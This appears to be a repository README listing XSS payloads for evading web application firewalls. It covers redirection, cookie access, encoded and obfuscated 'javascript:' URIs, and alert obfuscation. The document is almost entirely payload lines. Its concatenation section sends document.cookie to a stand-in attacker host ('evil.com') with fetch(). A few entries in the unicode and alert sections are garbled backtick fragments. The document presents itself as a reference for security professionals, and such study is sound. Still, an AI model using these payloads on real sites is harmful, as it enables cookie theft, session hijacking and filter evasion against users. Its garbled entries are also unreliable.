1. Redirection Techniques:

XSS payloads that manipulate redirection are some of the simplest but most effective methods. These techniques leverage JavaScript to redirect users to malicious sites or initiate further exploits:

document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location=
window.location.assign()
window['location']['href']=
document.location.replace()
window.open("http://malicious-site.com", "_blank");


2. Link Manipulation
Sometimes, just a slight alteration in how a link is crafted can help bypass certain filters. Here's how to make that happen:

//example.com/?a=
//134744072:1234/?a= (Using decimal IP addresses to confuse filters)


3. Cookie Stealing

Extracting cookies can be a significant part of XSS exploitation. The following payloads can be used to access cookies in different ways:

document.cookie
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]


4. Concatenation Techniques

By combining strings in JavaScript, one can obfuscate the payloads and slip past certain WAFs. This technique is useful when dealing with filters that are strict on specific patterns.

fetch("//evil.com/?c="+document.cookie)
fetch("//evil.com/?c=".concat(document.cookie))
fetch(["//evil.com/?c=", document.cookie].join())
fetch(`//evil.com/?c=${document.cookie}`)

5. Bypassing via Href Attributes

Using JavaScript in href attributes can be particularly powerful for initiating payloads when WAFs are less strict on such elements:

javascript:alert(1)
JaVaScript:alert(1)
ja&Tab;vascript:alert(1)
java\tscript:alert(1)
ja&NewLine;vascript:alert(1)
ja&#x0000A;vascript:alert(1)
java&#x73;cript:alert()
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')

6. Special Character Variations

Inserting characters like tabs, newlines, and carriage returns into payloads can bypass filters that do not properly sanitize input:

jav asc ript :alert(1) (Using tabs in between)
java script:alert(1) (Using spaces to split the payload)

7. Using Unicode Representations

Leveraging Unicode representations of JavaScript can often bypass WAFs that do not recognize encoded sequences:

`javascript
\u006Cert```
`javascript:\u0061\u006C\u0065\u0072\u0074```

8. Colon and Protocol Variations

Manipulating the colon and protocol representations can effectively bypass some WAFs that strictly check for specific strings:

javascript&colon;alert()
javascript&#x0003A;alert()
javascript&#58;alert(1)
javascript&#x3A;alert()
javascript://%0Aalert(1)
javascript://%0Dalert(1)

9. Target Attribute Exploitation

Using different click behaviors (like Ctrl+Click or Shift+Click) to bypass security measures that rely on normal click behavior:

Scroll Click
Shift + Click
Ctrl + Click

10. Obfuscating Alert Functions

Obfuscating the alert function is a classic method for evading detection:

javascript:alert&lpar;&rpar;
`javascript
ert```
javascript:alert%60%60
javascript:x='%27-alert(1)-%27';
javascript:%61%6c%65%72%74%28%29

Conclusion

These techniques represent a fraction of the creative ways XSS payloads can be crafted to bypass WAFs. The key is in understanding how different WAFs analyze incoming data and then crafting payloads that do not match expected patterns. This repository aims to serve as a quick reference for security professionals looking to expand their knowledge of XSS attack vectors and WAF evasion techniques.